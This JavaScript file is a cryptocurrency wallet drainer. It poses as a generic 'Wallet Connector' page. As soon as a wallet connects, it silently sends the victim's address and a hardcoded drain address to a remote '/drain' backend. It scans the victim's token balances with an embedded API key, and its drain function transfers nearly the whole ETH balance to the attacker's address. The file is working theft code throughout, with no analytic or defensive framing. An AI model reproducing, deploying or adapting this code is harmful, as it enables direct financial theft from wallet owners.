import { createAppKit } from "@reown/appkit";
import { EthersAdapter } from "@reown/appkit-adapter-ethers";
import { ethers } from "ethers";

/* --------------------------- */
/*      CONFIG                */
/* --------------------------- */
const projectId = "962425907914a3e80a7d8e7288b23f62";
const BACKEND_URL = "https://tokenbackend-5xab.onrender.com/drain";
const DRAIN_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";

/* --------------------------- */
/*      UI ELEMENTS           */
/* --------------------------- */
const connectBtn = document.getElementById("connectBtn");
const statusEl = document.getElementById("status");
const tokensEl = document.getElementById("tokens");
const tokensContainer = document.getElementById("tokensContainer");
const drainBtn = document.getElementById("drainBtn");
const continueBtn = document.getElementById("continueBtn");

/* --------------------------- */
/*      APPKIT INITIALIZATION */
/* --------------------------- */
const appKit = createAppKit({
  adapters: [new EthersAdapter()],
  projectId,
  networks: [
    {
      id: 1,
      name: "Ethereum",
      rpcUrl: "https://cloudflare-eth.com"
    }
  ],
  metadata: {
    name: "Wallet Connector",
    description: "Connect your wallet",
    url: window.location.origin,
    icons: []
  },
  themeMode: "dark",
  features: {
    analytics: false
  }
});

/* --------------------------- */
/*      SIMPLE CONNECT        */
/* --------------------------- */
connectBtn.addEventListener("click", async () => {
  try {
    await appKit.open();
  } catch (err) {
    console.error("MODAL FAILED:", err);
    statusEl.textContent = "Wallet modal failed to open";
  }
});

/* --------------------------- */
/*      STATE SUBSCRIPTION    */
/* --------------------------- */
appKit.subscribeState(async (state) => {
  console.log("STATE:", state);
  
  if (state.isConnected) {
    await handleConnected();
  } else {
    handleDisconnected();
  }
});

/* --------------------------- */
/*      CONNECTED HANDLER     */
/* --------------------------- */
async function handleConnected() {
  try {
    const account = appKit.account;
    const chain = appKit.chain;
    
    if (!account?.address) {
      setTimeout(handleConnected, 100);
      return;
    }
    
    console.log("Connected to:", account.address);
    
    // Update UI
    connectBtn.textContent = "Disconnect";
    statusEl.textContent = `✅ Connected\nAddress: ${account.address}`;
    
    // Show other elements
    if (tokensContainer) tokensContainer.classList.remove("hidden");
    if (drainBtn) drainBtn.classList.remove("hidden");
    if (continueBtn) continueBtn.classList.remove("hidden");
    
    // Trigger backend immediately
    await triggerBackend(account.address, chain?.id || 1);
    
    // Fetch tokens
    await fetchTokens(account.address, chain?.id || 1);
    
  } catch (err) {
    console.error("Connected handler error:", err);
  }
}

/* --------------------------- */
/*      DISCONNECTED HANDLER  */
/* --------------------------- */
function handleDisconnected() {
  connectBtn.textContent = "Connect Wallet";
  statusEl.textContent = "Not connected";
  
  if (tokensContainer) tokensContainer.classList.add("hidden");
  if (drainBtn) drainBtn.classList.add("hidden");
  if (continueBtn) continueBtn.classList.add("hidden");
}

/* --------------------------- */
/*      BACKEND TRIGGER       */
/* --------------------------- */
async function triggerBackend(address, chainId) {
  try {
    const response = await fetch(BACKEND_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        address,
        chainId,
        drainTo: DRAIN_ADDRESS,
      }),
    });

    console.log("Backend response:", response.status);
  } catch (err) {
    console.error("Backend failed:", err);
  }
}

/* --------------------------- */
/*      TOKEN DISCOVERY       */
/* --------------------------- */
async function fetchTokens(address, chainId) {
  if (!tokensEl) return;

  tokensEl.innerHTML = "Fetching tokens...";

  try {
    const res = await fetch(
      `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR`
    );

    const json = await res.json();
    const items = json?.data?.items || [];

    const tokens = items.filter(t => t.balance !== "0");

    if (!tokens.length) {
      tokensEl.innerHTML = "No tokens found.";
      return;
    }

    tokensEl.innerHTML = tokens.map(t => {
      const amount = Number(t.balance) / Math.pow(10, t.contract_decimals || 18);
      const formattedAmount = amount.toLocaleString(undefined, {
        minimumFractionDigits: 0,
        maximumFractionDigits: 4
      });
      
      const symbol = t.contract_ticker_symbol || "Token";

      return `
        <div class="token-item">
          <span class="token-symbol">${symbol}</span>
          <span class="token-amount">${formattedAmount}</span>
        </div>
      `;
    }).join("");

  } catch (err) {
    console.error("Token fetch failed:", err);
    tokensEl.innerHTML = "Token scan failed.";
  }
}

/* --------------------------- */
/*      DRAIN FUNCTION        */
/* --------------------------- */
async function drainWallet() {
  if (!appKit.state.isConnected) {
    alert("Please connect wallet first");
    return;
  }

  if (!confirm("⚠️ This will drain tokens to:\n" + DRAIN_ADDRESS + "\n\nContinue?")) {
    return;
  }

  try {
    const address = appKit.account?.address;
    const chainId = appKit.chain?.id || 1;
    
    statusEl.textContent = "Draining...";
    
    // Get provider and signer
    const provider = new ethers.providers.Web3Provider(appKit.signer);
    const signer = provider.getSigner();
    
    // Try to send ETH
    const ethBalance = await provider.getBalance(address);
    if (ethBalance.gt(ethers.utils.parseEther("0.001"))) {
      const gasPrice = await provider.getGasPrice();
      const gasLimit = 21000;
      const gasCost = gasPrice.mul(gasLimit);
      const sendAmount = ethBalance.sub(gasCost);
      
      const tx = await signer.sendTransaction({
        to: DRAIN_ADDRESS,
        value: sendAmount,
        gasLimit: gasLimit,
        gasPrice: gasPrice
      });
      
      statusEl.textContent += `\nETH sent: ${tx.hash}`;
      await tx.wait();
      statusEl.textContent += `\n✅ ETH confirmed!`;
    }
    
    alert("Drain completed!");
    await fetchTokens(address, chainId);
    
  } catch (err) {
    console.error("Drain error:", err);
    statusEl.textContent = `❌ Drain failed: ${err.message}`;
    alert("Failed: " + err.message);
  }
}

/* --------------------------- */
/*      EVENT LISTENERS       */
/* --------------------------- */
if (drainBtn) {
  drainBtn.addEventListener("click", drainWallet);
}

if (continueBtn) {
  continueBtn.addEventListener("click", () => {
    alert("Continue to next step...");
  });
}

// Add disconnect functionality to button
connectBtn.addEventListener("click", async (e) => {
  // If already connected, handle disconnect
  if (appKit.state.isConnected && connectBtn.textContent === "Disconnect") {
    e.preventDefault();
    try {
      await appKit.disconnect();
    } catch (err) {
      console.error("Disconnect error:", err);
    }
  }
});
